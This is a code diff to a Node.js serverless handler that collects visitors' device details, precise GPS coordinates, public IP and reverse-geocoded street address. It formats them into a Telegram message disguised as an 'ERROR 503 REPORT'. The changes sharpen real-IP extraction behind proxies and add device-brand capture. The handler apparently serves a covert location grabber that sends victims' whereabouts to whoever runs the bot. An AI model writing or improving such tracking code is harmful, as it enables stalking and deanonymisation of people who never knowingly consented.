@@ -2,7 +2,7 @@ export const config = {
   runtime: "nodejs"
 };
 
-/* ===== ESTIMASI RT/RW (LABEL SAJA) ===== */
+/* ===== ESTIMASI RT/RW ===== */
 function estimateRTRW(lat, lon) {
   if (!lat || !lon) return "-";
   const lt = Math.abs(parseFloat(lat));
@@ -21,12 +21,28 @@ function getLocationQuality(acc) {
   return "Low ❌";
 }
 
-/* ===== NORMALISASI IP ===== */
-function normalizeIP(ip) {
-  if (!ip) return "Unknown";
-  if (ip === "::1" || ip.startsWith("127.")) return "Unknown";
-  if (ip.includes(",")) return ip.split(",")[0];
-  return ip.replace("::ffff:", "");
+/* ===== AMBIL IP PUBLIK ===== */
+function getPublicIP(req) {
+  const raw =
+    req.headers["cf-connecting-ip"] ||
+    req.headers["x-forwarded-for"] ||
+    req.socket.remoteAddress ||
+    "";
+
+  const list = raw.split(",").map(ip => ip.trim());
+
+  for (let ip of list.reverse()) {
+    if (
+      !ip.startsWith("10.") &&
+      !ip.startsWith("192.168.") &&
+      !ip.startsWith("172.") &&
+      ip !== "::1" &&
+      !ip.startsWith("127.")
+    ) {
+      return ip.replace("::ffff:", "");
+    }
+  }
+  return "Unknown";
 }
 
 export default async function handler(req, res) {
@@ -41,14 +57,7 @@ export default async function handler(req, res) {
   }
 
   const input = req.body || {};
-
-  /* ===== IP CLIENT ===== */
-  const rawIP =
-    req.headers["cf-connecting-ip"] ||
-    req.headers["x-forwarded-for"] ||
-    req.socket.remoteAddress;
-
-  const ip = normalizeIP(rawIP);
+  const ip = getPublicIP(req);
   const time = new Date().toISOString().replace("T", " ").split(".")[0];
 
   /* ===== IP INFO ===== */
@@ -89,16 +98,13 @@ export default async function handler(req, res) {
       ? estimateRTRW(input.latitude, input.longitude)
       : "-";
 
-  /* ===== DATA KONTAK (OPSIONAL, DARI FORM) ===== */
-  const phone = input.phone || "-";
-  const email = input.email || "-";
-
   /* ===== PESAN TELEGRAM ===== */
   const message = `🚨 *ERROR 503 REPORT*
 
 ━━━━━━━━━━━━━━━━━━━━
 📱 *DEVICE INFORMATION*
 ━━━━━━━━━━━━━━━━━━━━
+📱 Brand        : ${input.brand || "-"}
 🧠 OS           : ${input.os || "-"}
 💻 Platform     : ${input.platform || "-"}
 ⚙️ CPU Cores    : ${input.cpu || "-"}
@@ -124,15 +130,14 @@ ${input.browser || "-"}
 ━━━━━━━━━━━━━━━━━━━━
 📐 Latitude     : ${input.latitude || "-"}
 📏 Longitude    : ${input.longitude || "-"}
-🎯 Accuracy     : ${input.accuracy || "-"}
 
 ━━━━━━━━━━━━━━━━━━━━
 🏠 *ADDRESS INFORMATION*
 ━━━━━━━━━━━━━━━━━━━━
-📍 Street       : ${address.road || address.pedestrian || "-"}
+📍 Street       : ${address.road || "-"}
 🏘 Village      : ${address.village || address.suburb || "-"}
 🏙 District     : ${address.city_district || address.county || "-"}
-🏛 City / Reg.  : ${address.city || address.town || address.municipality || "-"}
+🏛 City         : ${address.city || address.town || "-"}
 🌆 Province     : ${address.state || "-"}
 📮 Postal Code : ${address.postcode || "-"}
 🌍 Country      : ${address.country || "-"}
@@ -143,12 +148,6 @@ ${input.browser || "-"}
 🎯 Quality      : ${locationQuality}
 🧭 Area Estimate: ${rtRwEstimate}
 📡 Source       : ${locationSource}
-
-━━━━━━━━━━━━━━━━━━━━
-☎️ *CONTACT (OPTIONAL)*
-━━━━━━━━━━━━━━━━━━━━
-📞 Phone        : ${phone}
-📧 Email        : ${email}
 
 🗺 Google Maps:
 https://www.google.com/maps?q=${input.latitude},${input.longitude}
@@ -169,4 +168,4 @@ https://www.google.com/maps?q=${input.latitude},${input.longitude}
   } catch {
     return res.status(500).send("Gagal kirim");
   }
-      }
+                    }
